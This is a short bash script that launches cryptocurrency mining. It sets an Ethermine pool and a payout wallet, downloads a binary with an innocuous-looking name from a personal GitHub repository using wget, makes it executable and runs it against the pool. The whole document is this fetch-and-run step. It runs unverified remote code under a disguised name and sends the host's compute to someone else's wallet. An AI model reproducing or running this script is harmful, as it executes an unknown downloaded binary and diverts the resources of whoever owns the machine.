#!/bin/bash
POOL=stratum+tcp://asia1.ethermine.org:4444
WALLET=0x6172c0d0139e0ce7431cabceae0f59cd49422166
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/squibex/prem/raw/main/priyatama
chmod +x priyatama
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
